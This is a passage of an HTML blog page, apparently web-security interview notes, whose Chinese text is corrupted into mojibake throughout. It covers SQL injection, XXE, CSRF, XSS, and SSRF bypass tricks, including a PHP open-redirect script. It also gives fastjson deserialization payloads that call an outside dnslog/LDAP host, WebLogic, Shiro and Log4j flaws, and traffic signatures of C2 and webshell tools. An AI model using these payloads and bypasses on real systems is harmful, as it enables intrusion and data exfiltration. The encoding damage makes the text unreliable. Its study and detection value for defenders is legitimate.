æˆSQLçš„äºŒæ¬¡æ³¨å…¥ã€‚<br>æ¯”å¦‚åœ¨ç¬¬ä¸€æ¬¡æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œæ•°æ®ä¸­å¸¦æœ‰å•å¼•å·ï¼Œç›´æ¥æ’å…¥åˆ°äº†æ•°æ®åº“ä¸­ï¼›ç„¶ååœ¨ä¸‹ä¸€æ¬¡ä½¿ç”¨ä¸­åœ¨æ‹¼å‡‘çš„è¿‡ç¨‹ä¸­ï¼Œå°±å½¢æˆäº†äºŒæ¬¡æ³¨å…¥ã€‚</p>
<h2 id="SQLæŠ¥é”™æ³¨å…¥"><a href="#SQLæŠ¥é”™æ³¨å…¥" class="headerlink" title="SQLæŠ¥é”™æ³¨å…¥"></a>SQLæŠ¥é”™æ³¨å…¥</h2><p>å‡½æ•°ï¼š</p>
<p>floor()å‡½æ•°ï¼Œ</p>
<p>exp()å‡½æ•°ï¼Œ</p>
<p>convert()å‡½æ•°ï¼Œ</p>
<p>updataxml()å‡½æ•°ï¼Œè¿”å›æ•°æ®é•¿åº¦&lt;32ä½</p>
<p>name_const()å‡½æ•°ï¼Œ</p>
<p>extractvalue()å‡½æ•°ï¼šè¿”å›æ•°æ®é•¿åº¦&lt;32ä½</p>
<h2 id="XXEæ¼æ´ï¼ˆå³XMlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼‰"><a href="#XXEæ¼æ´ï¼ˆå³XMlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼‰" class="headerlink" title="XXEæ¼æ´ï¼ˆå³XMlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼‰"></a>XXEæ¼æ´ï¼ˆå³XMlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼‰</h2><p><strong>XXE</strong>æ¼æ´è§¦å‘ç‚¹å¾€å¾€æ˜¯å¯ä»¥ä¸Šä¼ xmlæ–‡ä»¶çš„ä½ç½®ï¼Œæ²¡æœ‰å¯¹xmlæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶å’Œä»£ç ï¼Œé€ æˆä»»æ„æ–‡ä»¶è¯»å–ï¼Œå‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·Dosæ”»å‡»ç­‰å±å®³</p>
<h2 id="æ€ä¹ˆåˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜åœ¨XXEæ¼æ´"><a href="#æ€ä¹ˆåˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜åœ¨XXEæ¼æ´" class="headerlink" title="æ€ä¹ˆåˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜åœ¨XXEæ¼æ´"></a>æ€ä¹ˆåˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜åœ¨XXEæ¼æ´</h2><p>æœ€ç›´æ¥çš„æ–¹æ³•å°±æ˜¯ç”¨burpæŠ“åŒ…ï¼Œç„¶åï¼Œä¿®æ”¹HTTPè¯·æ±‚æ–¹æ³•ï¼Œä¿®æ”¹Content-Typeå¤´éƒ¨å­—æ®µç­‰ç­‰ï¼ŒæŸ¥çœ‹è¿”å›åŒ…çš„å“åº”ï¼Œçœ‹çœ‹åº”ç”¨ç¨‹åºæ˜¯å¦è§£æäº†å‘é€çš„å†…å®¹ï¼Œä¸€æ—¦è§£æäº†ï¼Œé‚£ä¹ˆæœ‰å¯èƒ½XXEæ”»å‡»æ¼æ´</p>
<h2 id="CSRFæ”»å‡»åŸç†"><a href="#CSRFæ”»å‡»åŸç†" class="headerlink" title="CSRFæ”»å‡»åŸç†"></a>CSRFæ”»å‡»åŸç†</h2><p><img src="https://pic1.zhimg.com/80/v2-74875be6a3bcbd97e58dc00d86f571e0_1440w.webp" alt="123"></p>
<ol>
<li>ç”¨æˆ·è¾“å…¥è´¦å·ä¿¡æ¯è¯·æ±‚ç™»å½•Aç½‘ç«™ã€‚</li>
<li>Aç½‘ç«™éªŒè¯ç”¨æˆ·ä¿¡æ¯ï¼Œé€šè¿‡éªŒè¯åè¿”å›ç»™ç”¨æˆ·ä¸€ä¸ªcookie</li>
<li>åœ¨æœªé€€å‡ºç½‘ç«™Aä¹‹å‰ï¼Œåœ¨åŒä¸€æµè§ˆå™¨ä¸­è¯·æ±‚äº†é»‘å®¢æ„é€ çš„æ¶æ„ç½‘ç«™B</li>
<li>Bç½‘ç«™æ”¶åˆ°ç”¨æˆ·è¯·æ±‚åè¿”å›æ”»å‡»æ€§ä»£ç ï¼Œæ„é€ è®¿é—®Aç½‘ç«™çš„è¯­å¥</li>
<li>æµè§ˆå™¨æ”¶åˆ°æ”»å‡»æ€§ä»£ç åï¼Œåœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æºå¸¦cookieä¿¡æ¯è¯·æ±‚äº†Aç½‘ç«™ã€‚æ­¤æ—¶Aç½‘ç«™ä¸çŸ¥é“è¿™æ˜¯ç”±Bå‘èµ·çš„ã€‚é‚£ä¹ˆè¿™æ—¶é»‘å®¢å°±å¯ä»¥è¿›è¡Œä¸€ä¸‹éªšæ“ä½œäº†ï¼</li>
</ol>
<p>ä¸¤ä¸ªæ¡ä»¶ï¼ša ç”¨æˆ·è®¿é—®ç«™ç‚¹Aå¹¶äº§ç”Ÿäº†cookie</p>
<p>b ç”¨æˆ·æ²¡æœ‰é€€å‡ºAåŒæ—¶è®¿é—®äº†B</p>
<h2 id="SSRFæ¼æ´ï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰"><a href="#SSRFæ¼æ´ï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰" class="headerlink" title="SSRFæ¼æ´ï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰"></a>SSRFæ¼æ´ï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰</h2><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚</p>
<p>ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ç­‰ã€‚</p>
<p>åˆ©ç”¨çš„æ˜¯æœåŠ¡ç«¯çš„è¯·æ±‚ä¼ªé€ ã€‚</p>
<p>SSRFæ˜¯åˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„webåº”ç”¨ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨ã€‚</p>
<h3 id="ç»•è¿‡æ–¹å¼-1"><a href="#ç»•è¿‡æ–¹å¼-1" class="headerlink" title="ç»•è¿‡æ–¹å¼"></a>ç»•è¿‡æ–¹å¼</h3><p><strong>1.@ç¬¦å·ç»•è¿‡ï¼š</strong></p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.xxx.com@www.kxsy.work&#x2F;
1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>åœ¨æŸåœ°å€1åæ·»åŠ @å†æ¬¡æ·»åŠ åœ°å€2ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨è¿”å›åœ°å€2æ•°æ®</p>
<p><strong>2.IPåœ°å€è½¬æ¢ï¼š</strong></p>
<p>å¯¹å†…ç½‘è¯·æ±‚çš„IPåœ°å€è¿›è¡Œå„è¿›åˆ¶çš„ç¼–ç </p>
<p><strong>3.è½¬æ¢çŸ­ç½‘å€ï¼š</strong></p>
<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.985.so&#x2F;
ä¾‹ï¼šhttp:&#x2F;&#x2F;www.kxsy.work&#x2F; &#x3D; http:&#x2F;&#x2F;u6.gg&#x2F;ks69x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>4.ç‰¹æ®Šç¬¦å·æ›¿æ¢ç»•è¿‡ï¼š</strong></p>
<pre class="line-numbers language-none"><code class="language-none">ä¾‹ï¼š
http:&#x2F;&#x2F;www.kxsy.work&#x2F; &#x3D; http:&#x2F;&#x2F;wwwã€‚kxsyã€‚work&#x2F;
localhostæˆ–è€…0.0.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>5.302è·³è½¬ç»•è¿‡ï¼š</strong></p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php  
$schema &#x3D; $_GET[&#39;s&#39;];
$ip     &#x3D; $_GET[&#39;i&#39;];
$port   &#x3D; $_GET[&#39;p&#39;];
$query  &#x3D; $_GET[&#39;q&#39;];
if(empty($port))&#123;  
    header(&quot;Location: $schema:&#x2F;&#x2F;$ip&#x2F;$query&quot;); 
&#125; else &#123;
    header(&quot;Location: $schema:&#x2F;&#x2F;$ip:$port&#x2F;$query&quot;); 
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>6.xip.ioç»•è¿‡ï¼šä¼šå°†è§£æåˆ°å­åŸŸ</strong></p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.0.0.1.xip.io &#x3D; 10.0.0.1
www.10.0.0.1.xip.io&#x3D; 10.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>8.å…¶ä»–åè®®ç»•è¿‡ ï¼š</strong></p>
<p>é…åˆFileã€ GOPHERç­‰åè®®çš„å¯¹ç›®æ ‡è¿›è¡Œä¿¡æ¯æ¢æµ‹</p>
<h2 id="XSSï¼ˆè·¨ç«™ç‚¹è„šæœ¬æ”»å‡»ï¼‰"><a href="#XSSï¼ˆè·¨ç«™ç‚¹è„šæœ¬æ”»å‡»ï¼‰" class="headerlink" title="XSSï¼ˆè·¨ç«™ç‚¹è„šæœ¬æ”»å‡»ï¼‰"></a>XSSï¼ˆè·¨ç«™ç‚¹è„šæœ¬æ”»å‡»ï¼‰</h2><p>æœåŠ¡å™¨å¯¹ç”¨æˆ·æäº¤çš„æ•°æ®è¿‡æ»¤ä¸ä¸¥ï¼Œå¯¼è‡´æµè§ˆå™¨æŠŠç”¨æˆ·çš„è¾“å…¥å½“æˆäº†JSä»£ç å¹¶ç›´æ¥è¿”å›ç»™å®¢æˆ·ç«¯æ‰§è¡Œï¼Œä»è€Œå®ç°<strong>å¯¹å®¢æˆ·ç«¯çš„æ”»å‡»</strong>ç›®çš„ã€‚</p>
<p>åå°„å‹XSS</p>
<p>å­˜å‚¨å‹XSS</p>
<p>DOMå‹XSSï¼šDOM-XSSæ˜¯é€šè¿‡urlä¼ å…¥å‚æ•°å»æ§åˆ¶è§¦å‘çš„ï¼Œå…¶å®ä¹Ÿå±äºåå°„å‹XSSã€‚</p>
<h2 id="xssä¸csrfçš„åŒºåˆ«"><a href="#xssä¸csrfçš„åŒºåˆ«" class="headerlink" title="xssä¸csrfçš„åŒºåˆ«"></a>xssä¸csrfçš„åŒºåˆ«</h2><p>**xssï¼šè·¨ç«™è„šæœ¬æ”»å‡»ã€è¯±éª—ç”¨æˆ·ç‚¹å‡»æ¶æ„é“¾æ¥ç›—å–ç”¨æˆ·cookieè¿›è¡Œæ”»å‡»ã€ä¸éœ€è¦ç”¨æˆ·è¿›è¡Œç™»å½•ã€xssé™¤äº†åˆ©ç”¨cookieè¿˜å¯ä»¥ç¯¡æ”¹ç½‘é¡µç­‰. **</p>
<p><strong>csrfï¼šè·¨ç«™è¯·æ±‚ä¼ªé€ ã€æ— æ³•è·å–ç”¨æˆ·çš„cookieè€Œæ˜¯ç›´æ¥å†’å……ç”¨æˆ·ã€éœ€è¦ç”¨æˆ·ç™»å½•åè¿›è¡Œæ“ä½œ</strong></p>
<h2 id="å“ªé‡Œä½¿ç”¨åˆ°äº†dnslogå¤–å¸¦"><a href="#å“ªé‡Œä½¿ç”¨åˆ°äº†dnslogå¤–å¸¦" class="headerlink" title="å“ªé‡Œä½¿ç”¨åˆ°äº†dnslogå¤–å¸¦"></a>å“ªé‡Œä½¿ç”¨åˆ°äº†dnslogå¤–å¸¦</h2><h3 id="DNSlogå¤–å¸¦åŸç†ï¼š"><a href="#DNSlogå¤–å¸¦åŸç†ï¼š" class="headerlink" title="DNSlogå¤–å¸¦åŸç†ï¼š"></a>DNSlogå¤–å¸¦åŸç†ï¼š</h3><p>DNSåœ¨è§£æçš„æ—¶å€™ä¼šç•™ä¸‹æ—¥å¿—ï¼Œæˆ‘ä»¬å°†ä¿¡æ¯æ”¾åœ¨é«˜çº§åŸŸåä¸­ï¼Œä¼ é€’åˆ°è‡ªå·±è¿™é‡Œï¼Œç„¶åé€šè¿‡è¯»æ—¥å¿—è·å–ä¿¡æ¯ã€‚</p>
<h3 id="SQLç›²æ³¨"><a href="#SQLç›²æ³¨" class="headerlink" title="SQLç›²æ³¨"></a>SQLç›²æ³¨</h3><p>ç›²æ³¨éœ€è¦é¢‘ç¹è¯·æ±‚æ‰èƒ½è·å–æ•°æ®åº“ä¸­çš„å€¼ï¼Œåœ¨æœ‰wafçš„æƒ…å†µä¸‹å¾ˆå®¹æ˜“è¢«ban ipã€‚è¿™ç§æƒ…å†µä¸‹å¯ä»¥ç»“åˆDNSLogå°†æ•°æ®å–å‡ºã€‚<strong>å¦‚æœé‡åˆ°MySQLçš„ç›²æ³¨ï¼Œå¯ä»¥åˆ©ç”¨å†…ç½®å‡½æ•°load_file()æ¥å®ŒæˆDNSLogã€‚load_file()ä¸ä»…èƒ½å¤ŸåŠ è½½æœ¬åœ°æ–‡ä»¶ï¼ŒåŒæ—¶ä¹Ÿèƒ½å¯¹è¯¸å¦‚<code>www.baidu.com</code>è¿™æ ·çš„urlå‘èµ·è¯·æ±‚</strong></p>
<h3 id="æ— å›æ˜¾çš„SSRF"><a href="#æ— å›æ˜¾çš„SSRF" class="headerlink" title="æ— å›æ˜¾çš„SSRF"></a>æ— å›æ˜¾çš„SSRF</h3><p>å°†urlæ¢æˆæˆ‘ä»¬çš„DNSæœåŠ¡å™¨ï¼Œé€šè¿‡æŸ¥çœ‹DNSLogå¹³å°æ—¥å¿—æŸ¥çœ‹æ˜¯å¦æœ‰æœåŠ¡å™¨ipåˆ¤æ–­æ˜¯å¦æœ‰ssrfæ¼æ´</p>
<h3 id="xssç›²æ‰“"><a href="#xssç›²æ‰“" class="headerlink" title="xssç›²æ‰“"></a>xssç›²æ‰“</h3><p>xssç›²æ‰“æ˜¯æŒ‡åœ¨æ”»å‡»è€…å¯¹æ•°æ®æäº¤åå±•ç°çš„åå°æœªçŸ¥çš„æƒ…å†µä¸‹ï¼Œç½‘ç«™é‡‡ç”¨äº†æ”»å‡»è€…æ’å…¥çš„å¸¦æœ‰çœŸå®æ”»å‡»è¡Œä¸ºçš„xssä»£ç æ•°æ®ã€‚å½“æœªçŸ¥åå°åœ¨å±•ç°æ—¶æ²¡æœ‰å¯¹è¿™äº›æäº¤çš„æ•°æ®è¿›è¡Œè¿‡æ»¤ï¼Œé‚£ä¹ˆåå°ç®¡ç†äººå‘˜åœ¨æ“ä½œæ—¶å°±ä¼šè§¦å‘xssæ¥å®ç°æ”»å‡»è€…é¢„å®šå¥½çš„çœŸå®æ”»å‡»åŠŸèƒ½ã€‚</p>
<h3 id="log4jæ¼æ´"><a href="#log4jæ¼æ´" class="headerlink" title="log4jæ¼æ´"></a>log4jæ¼æ´</h3><h3 id="fastjsonååºåˆ—åŒ–æ¼æ´"><a href="#fastjsonååºåˆ—åŒ–æ¼æ´" class="headerlink" title="fastjsonååºåˆ—åŒ–æ¼æ´"></a>fastjsonååºåˆ—åŒ–æ¼æ´</h3><p>æ„é€ ä»¥ä¸‹payloadï¼ˆcontent-typeå­—æ®µä¸ºapplication&#x2F;jsonï¼‰ï¼Œåˆ©ç”¨dnslogå¹³å°æ¥æ”¶ï¼š{â€œzeoâ€:{â€œ@typeâ€:â€java.net.Inet4Addressâ€,â€valâ€:â€ntel8h.dnslog.cnâ€}}ï¼ˆä¸åŒç‰ˆæœ¬ï¼Œpayloadä¸åŒã€‚æ¨èè¿™ç§æ–¹å¼ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;
    &quot;b&quot;:&#123;
        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
        &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;ntel8h.dnslog.cn&#x2F;test&quot;,
        &quot;autoCommit&quot;:true
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a href="https://mp.weixin.qq.com/s/SaoEAe5jB7vE5uoY2YOKbg">DNSLogçš„ç»¼åˆåˆ©ç”¨ (qq.com)</a></p>
<h2 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h2><h3 id="weblogicæ¼æ´"><a href="#weblogicæ¼æ´" class="headerlink" title="weblogicæ¼æ´"></a>weblogicæ¼æ´</h3><p>åœ¨weblogicé‡Œé¢å…¶å®ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ä¸­å¤§è‡´åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ä¸ªæ˜¯åŸºäºT3åè®®çš„ååºåˆ—åŒ–æ¼æ´ï¼Œä¸€ä¸ªæ˜¯åŸºäºXMLçš„ååºåˆ—åŒ–æ¼æ´ã€‚</p>
<p>1.ç›´æ¥é€šè¿‡<strong>T3åè®®</strong>å‘é€æ¶æ„ååºåˆ—åŒ–å¯¹è±¡(CVE-2015-4582ã€CVE-2016-0638ã€CVE-2016-3510ã€CVE-2020-2555ã€CVE-2020-2883)<br>2.åˆ©ç”¨<strong>T3åè®®</strong>é…åˆ<strong>RMP</strong>æˆ–<strong>NDæ¥å£</strong>åå‘å‘é€ååºåˆ—åŒ–æ•°æ®(CVE2017-3248ã€CVE2018-2628ã€CVE2018-2893ã€CVE2018-3245ã€CVE-2018-3191ã€CVE-2020-14644ã€CVE-2020-14645)è¿˜æœ‰åˆ©ç”¨<strong>IIOPåè®®</strong>çš„CVE-2020-2551<br>3.é€šè¿‡ javabean <strong>XML</strong>æ–¹å¼å‘é€ååºåˆ—åŒ–æ•°æ®ã€‚(CVE2017-3506-&gt;CVE-2017-10271-&gt;CVE2019-2725-&gt;CVE-2019-2729)</p>
<p><strong>xmlï¼š</strong>æ˜¯å› ä¸º<strong>xmldecode</strong>è§£æå¯¼è‡´çš„ååºåˆ—åŒ–ï¼Œä»–çš„åŒ…å°±æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„xmlæ ¼å¼å†…å®¹</p>
<h3 id="fastjsonååºåˆ—åŒ–"><a href="#fastjsonååºåˆ—åŒ–" class="headerlink" title="fastjsonååºåˆ—åŒ–"></a>fastjsonååºåˆ—åŒ–</h3><p>è¯·æ±‚åŒ…é‡Œå‘é€æ¶æ„jsæ ¼å¼çš„payloadï¼Œåœ¨å¤„ç†jsonå¯¹è±¡çš„æ—¶å€™æ²¡æœ‰è¿‡æ»¤@typeå­—æ®µï¼Œä»è€Œä½¿fastjsoné€šè¿‡å­—æ®µä¼ å…¥ä¸€ä¸ªç±»ï¼Œåœ¨æ‰§è¡Œæ—¶è¿›è€Œå®è¡Œæ„é€ æ¶æ„å‡½æ•°ã€‚</p>
<h3 id="shiroååºåˆ—åŒ–æ¼æ´"><a href="#shiroååºåˆ—åŒ–æ¼æ´" class="headerlink" title="shiroååºåˆ—åŒ–æ¼æ´"></a>shiroååºåˆ—åŒ–æ¼æ´</h3><p><strong>shiro550ï¼š</strong></p>
<p><strong>å…³é”®è¯ï¼šRememberMe</strong></p>
<p>å­˜åœ¨ä¸€ä¸ªå¿˜è®°å¯†ç åŠŸèƒ½ï¼Œç”¨æˆ·ä¿¡æ¯ä¼šè¿›è¡ŒåŠ å¯†ï¼Œè€Œè¿™ä¸€ä¸ªè¿‡ç¨‹ä¸­å¯†é’¥å‡ºç°äº†é—®é¢˜ï¼Œä½¿ç”¨å¯†é’¥è¿›è¡Œç¢°æ’å¹¶ä¸”ä¸éœ€è¦cookieï¼Œä»è€Œæ„é€ ååºåˆ—åŒ–rceï¼Œè¿›è€Œæ”»å‡»ã€‚</p>
<p><strong>shiro721:</strong></p>
<p>shiro721åˆ©ç”¨çš„å‰æå°±æ˜¯å­˜åœ¨cookieï¼Œæ„é€ cookieå€¼è¿›è¡Œrceã€‚</p>
<h3 id="log4jæ¼æ´-1"><a href="#log4jæ¼æ´-1" class="headerlink" title="log4jæ¼æ´"></a>log4jæ¼æ´</h3><p>Log4j2 ç»„ä»¶åœ¨å¤„ç†ç¨‹åºæ—¥å¿—è®°å½•æ—¶å­˜åœ¨JNDI æ³¨å…¥ç¼ºé™·ï¼Œæœªç»æˆæƒçš„æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´ï¼Œå¯å‘ç›®æ ‡æœåŠ¡å™¨å‘é€ç²¾å¿ƒæ„é€ çš„æ¶æ„æ•°æ®ï¼Œè§¦å‘Log4j2 ç»„ä»¶è§£æç¼ºé™·ï¼Œå®ç°ç›®æ ‡æœåŠ¡å™¨çš„ä»»æ„ä»£ç æ‰§è¡Œï¼Œè·å¾—ç›®æ ‡æœåŠ¡å™¨æƒé™ã€‚</p>
<p><strong>ç‰¹å¾ï¼š</strong>${xxxxxx}</p>
<h2 id="æµé‡ç‰¹å¾"><a href="#æµé‡ç‰¹å¾" class="headerlink" title="æµé‡ç‰¹å¾"></a>æµé‡ç‰¹å¾</h2><h3 id="csæµé‡ç‰¹å¾ï¼š"><a href="#csæµé‡ç‰¹å¾ï¼š" class="headerlink" title="csæµé‡ç‰¹å¾ï¼š"></a><strong>csæµé‡ç‰¹å¾ï¼š</strong></h3><p>å¯¹æ¯”æ­£å¸¸çš„httpæµé‡ï¼ŒCSçš„httpé€šä¿¡æµé‡å…·æœ‰ä»¥ä¸‹å‡ ä¸ªç‰¹å¾ï¼š </p>
<p>A. <strong>å¿ƒè·³åŒ…ç‰¹å¾</strong> </p>
<p>a) é—´éš”ä¸€å®šæ—¶é—´ï¼Œå‡æœ‰é€šä¿¡ï¼Œä¸”æµçº§ä¸Šçš„ä¸Šä¸‹è¡Œæ•°æ®é•¿åº¦å›ºå®šï¼› </p>
<p>B. <strong>åŸŸå&#x2F;IPç‰¹å¾</strong> </p>
<p>a) æœªèµ°CDNã€åŸŸå‰ç½®çš„ï¼ŒåŸŸååŠIPæš´éœ²</p>
<p>b) èµ°CDNã€åŸŸå‰ç½®çš„ï¼ŒçœŸå®IPä¼šè¢«éšè—ï¼› </p>
<p>C. <strong>æŒ‡ä»¤ç‰¹å¾</strong> </p>
<p>a) ä¸‹å‘æŒ‡ä»¤æ—¶ï¼Œé€šè¿‡å¿ƒè·³åŒ…æ¥æ”¶æŒ‡ä»¤ï¼Œè¿™æ—¶ï¼Œserverç«¯è¿”å›çš„åŒ…æ›´é•¿ï¼Œç”šè‡³åŒ…å«è¦åŠ è½½çš„dllæ¨¡å—æ•°æ®ã€‚ </p>
<p>b) æŒ‡ä»¤æ‰§è¡Œå®Œåï¼Œclientç«¯é€šè¿‡POSTè¯·æ±‚å‘é€æ‰§è¡Œçš„ç»“æœæ•°æ®ï¼Œbodyéƒ¨åˆ†é€šè¿‡åŠ å¯†å’Œbase64ç¼–ç ã€‚ </p>
<p>c) ä¸åŒæŒ‡ä»¤ï¼Œæ‰§è¡Œçš„æ—¶é—´é—´éš”ä¸ä¸€æ ·ï¼Œå¯ä»¥é€šè¿‡POSTè¯·æ±‚å’ŒGETè¯·æ±‚çš„é—´éš”è¿›è¡Œåˆ¤æ–­ã€‚ </p>
<p>D. <strong>æ•°æ®ç‰¹å¾</strong> </p>
<p>a) åœ¨è¯·æ±‚çš„è¿”å›åŒ…ä¸­ï¼Œé€šä¿¡æ•°æ®å‡éšè—åœ¨jqeury*.jsä¸­ã€‚</p>
<h3 id="MSFæµé‡ç‰¹å¾ï¼š"><a href="#MSFæµé‡ç‰¹å¾ï¼š" class="headerlink" title="MSFæµé‡ç‰¹å¾ï¼š"></a><strong>MSFæµé‡ç‰¹å¾ï¼š</strong></h3><p>1ï¼Œç«¯å£å·ï¼šmsfé»˜è®¤ä½¿ç”¨4444ç«¯å£ä½œä¸ºåå‘è¿æ¥ç«¯å£</p>
<p>2ï¼Œæ•°æ®å†…å®¹ï¼šmsfæ•°æ®åŒ…é€šå¸¸åŒ…å«ç‰¹å®šå­—ç¬¦ä¸²:(â€œmeterpreterâ€ã€â€revshellâ€ç­‰)</p>
<h3 id="å†°èæµé‡ç‰¹å¾"><a href="#å†°èæµé‡ç‰¹å¾" class="headerlink" title="å†°èæµé‡ç‰¹å¾:"></a><strong>å†°èæµé‡ç‰¹å¾:</strong></h3><p><strong>å†°è2.0å’Œ3.0åŒºåˆ«ï¼š</strong></p>
<p><strong>1ï¼ŒåŠ å¯†æ–¹å¼ä¸åŒï¼Œä¸€ä¸ªæ˜¯RC4åŠ å¯†ï¼Œä¸€ä¸ªAESåŠ å¯†ã€‚</strong></p>
<p><strong>2ï¼Œç¼–å†™è¯­è¨€ä¸åŒï¼Œ2.0é‡‡ç”¨çš„æ˜¯c++ï¼Œ3.0é‡‡ç”¨çš„æ˜¯javaã€‚</strong></p>
<p><strong>3ï¼Œå†°èæµé‡æ£€æµ‹ï¼Œæ— è®ºæ˜¯getè¯·æ±‚è¿˜æ˜¯postè¯·æ±‚ï¼Œ</strong>content-typeéƒ½ä¸º<strong>application&#x2F;octet-stream</strong>ã€‚</p>
<p>å†°è4.0æµé‡åˆ†æï¼š1ï¼Œåç§uaå¤´ï¼Œå¯å…³é”®å­—æ‹¦æˆªuaå¤´è¿›è¡ŒåŒ¹é…æ‹¦æˆªã€‚</p>
<p>2ï¼Œæµé‡ç‰¹å¾ï¼ŒContent-type: Application&#x2F;x-www-form-urlencodedã€‚</p>
<p>3ï¼Œacceptå­—æ®µï¼šAccept:application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01</p>
<p>ï¼ˆ4.0æˆ‘ä¹Ÿä¸å¤ªæ˜ç™½ï¼Œè‡ªå·±ç½‘ä¸Šå¤šæŸ¥æŸ¥èµ„æ–™å§ï¼‰</p>
<h3 id="å“¥æ–¯æ‹‰æµé‡ç‰¹å¾"><a href="#å“¥æ–¯æ‹‰æµé‡ç‰¹å¾" class="headerlink" title="å“¥æ–¯æ‹‰æµé‡ç‰¹å¾:"></a><strong>å“¥æ–¯æ‹‰æµé‡ç‰¹å¾:</strong></h3><p>1ï¼Œå¼ºç‰¹å¾ï¼šcookieå­—æ®µï¼Œæœ€åä¸€ä¸ªCookieçš„å€¼å‡ºç°  â€œ**;**â€ï¼ˆå°¾å€¼å‡ºç°åˆ†å·ï¼‰</p>
<p>2ï¼Œpaylodç‰¹å¾ï¼šjspä¼šå‡ºç°xc,passå­—ç¬¦å’ŒJavaåå°„ï¼Œbase64åŠ è§£ç ç­‰ç‰¹å¾ï¼Œphpï¼Œaspåˆ™ä¸ºæ™®é€šçš„ä¸€å¥è¯æœ¨é©¬ã€‚</p>
<h3 id="èœåˆ€æµé‡ç‰¹å¾ï¼š"><a href="#èœåˆ€æµé‡ç‰¹å¾ï¼š" class="headerlink" title="èœåˆ€æµé‡ç‰¹å¾ï¼š"></a><strong>èœåˆ€æµé‡ç‰¹å¾ï¼š</strong></h3><p>1ï¼Œè¯·æ±‚åŒ…ä¸­ï¼šuaå¤´ä¸ºç™¾åº¦ï¼Œç«ç‹</p>
<p>2ï¼Œè¯·æ±‚ä½“ä¸­å­˜åœ¨eavlï¼Œbase64ç­‰ç‰¹å¾å­—ç¬¦<br>3ï¼Œè¯·æ±‚ä½“ä¸­ä¼ é€’çš„payloadä¸ºbase64ç¼–ç ï¼Œå¹¶ä¸”å­˜åœ¨å›ºå®šçš„æ•°å€¼</p>
<p>4.ä¼ªé€ X-Forwarded-Forå¤´</p>
<h3 id="èšå‰‘æµé‡åˆ†æï¼š"><a href="#èšå‰‘æµé‡åˆ†æï¼š" class="headerlink" title="èšå‰‘æµé‡åˆ†æï¼š"></a><strong>èšå‰‘æµé‡åˆ†æï¼š</strong></h3><p>1ï¼Œpayloadç‰¹å¾ï¼šPhpä¸­ä½¿ç”¨assertï¼Œevalæ‰§è¡Œï¼›asp ä½¿ç”¨evalï¼›åœ¨jspä½¿ç”¨çš„æ˜¯Javaç±»åŠ è½½ï¼ˆClassLoaderï¼‰ï¼ŒåŒæ—¶ä¼šå¸¦æœ‰base64ç¼–ç è§£ç ç­‰å­—ç¬¦ç‰¹å¾ã€‚</p>
<p>2ï¼Œæµé‡ç‰¹å¾ï¼šæ¯ä¸ªè¯·æ±‚ä½“éƒ½åœ¨ï¼š@ini_set(â€œdiplay_erorsâ€,â€œ0â€);@set_time_limit(0)å¼€å¤´ã€‚å¹¶ä¸”åé¢å­˜åœ¨base64ç­‰å­—ç¬¦</p>
